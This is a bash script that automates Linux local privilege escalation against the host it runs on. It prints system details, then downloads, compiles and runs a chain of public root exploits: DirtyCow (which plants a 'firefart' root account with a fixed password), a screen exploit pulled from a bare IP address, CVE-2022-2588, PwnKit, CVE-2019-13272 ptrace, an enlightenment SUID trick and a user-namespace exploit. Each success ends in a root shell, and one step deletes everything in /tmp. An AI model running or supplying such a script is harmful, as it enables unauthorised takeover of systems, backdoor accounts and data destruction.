#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

uname=$(uname -a)
version=$(uname -r)
hostname=$(uname -n)

echo -e "$cyan[*]$yellow hostname :$okegreen $hostname"
echo -e "$cyan[*]$yellow version :$okegreen $version"
echo -e "$cyan[*]$yellow all :$okegreen $uname"

echo -e "$cyan[*]$yellow Trying Mass Exploits....."
echo -e "$cyan[*]$yellow Trying exploits DirtyCow....."
wget -q https://www.exploit-db.com/raw/40839 -O dirty.c
echo -e "$cyan[*]$yellow Trying Compiling DirtyCow....."
gcc -pthread dirty.c -o dirty -lcrypt
echo -e "$cyan[*]$yellow Setting Up default password :$okegreen cybersec1337.....$reset"
./dirty cybersec1337
sleep 5
if [[ $(cat /etc/passwd | grep firefart) =~ "firefart" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen Login: firefart| password: cybersec1337"
exit
else
echo -e "$cyan[*]$red Failed exploits DirtyCow"
sleep 1
echo -e "$cyan[*]$yellow Trying exploits screenroot....."
wget -q http://162.0.211.18/screen.sh
bash screen.sh
if [[ $(/tmp/rootshell shell id) =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen r00ted: $(/tmp/rootshell shell id)"
else
echo -e "$cyan[*]$red Failed exploits screenroot"
rm -rf screenrootbekup.sh
sleep 1
echo -e "$cyan[*]$yellow Trying exploits CVE-2022-2588....."
wget -q https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential;chmod 0755 exp_file_credential
./exp_file_credential
rm -rf exp_file_credential
if [[ $(cat /etc/passwd | grep ":0:0:/root/") =~ ":0:0:/root/" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
else
echo -e "$cyan[*]$red Failed exploits CVE-2022-2588"
sleep 1
echo -e "$cyan[*]$yellow Trying exploits PwnKit....."
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit;chmod +x ./PwnKit
if [[ $(./PwnKit 'id') =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen $(./PwnKit 'id')"
./PwnKit
else
echo -e "$cyan[*]$red Failed exploits PwnKit"
rm -rf PwnKit
sleep 1
echo -e "$cyan[*]$yellow Trying exploits ptrace....."
wget -q https://raw.githubusercontent.com/jas502n/CVE-2019-13272/master/CVE-2019-13272.c -O poc.c
gcc -s poc.c -o ptrace_traceme_root
./ptrace_traceme_root
if [[ $(id) =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
else
rm -rf ptrace_traceme_root
echo -e "$cyan[*]$red Failed exploits ptrace"
sleep 1
echo -e "$cyan[*]$yellow Trying exploits LPE....."
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -f "$file" ]];
then
echo -e "$cyan[*]$yellow Vulnerable SUID binary found!"
echo -e "$cyan[*]$yellow Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
else
echo -e "$cyan[*]$red Failed exploits LPE"
sleep 1
rm -rf /tmp/*
echo -e "$cyan[*]$yellow Trying exploits UserNS....."
wget -q https://raw.githubusercontent.com/anoaghost/Localroot_Compile/master/User-Name-Space-Linux-Privilege-Escalation-Ubuntu-18.04-LTS-Lucideus/user
chmod 0755 user
if [[ $(./user -p -m -U -M '0 1000 1' -G '0 1000 1' id) =~ "root" ]];
then
echo -e "$cyan[*]$okegreen Gotchaa.. success!"
echo -e "$cyan[*]$okegreen r00ted: $(./user -p -m -U -M '0 1000 1' -G '0 1000 1' id)"
./user -p -m -U -M '0 1000 1' -G '0 1000 1' /bin/sh
else
echo -e "$cyan[*]$red Failed exploits UserNS"
rm -rf user
fi
fi
fi
fi
fi
fi
fi
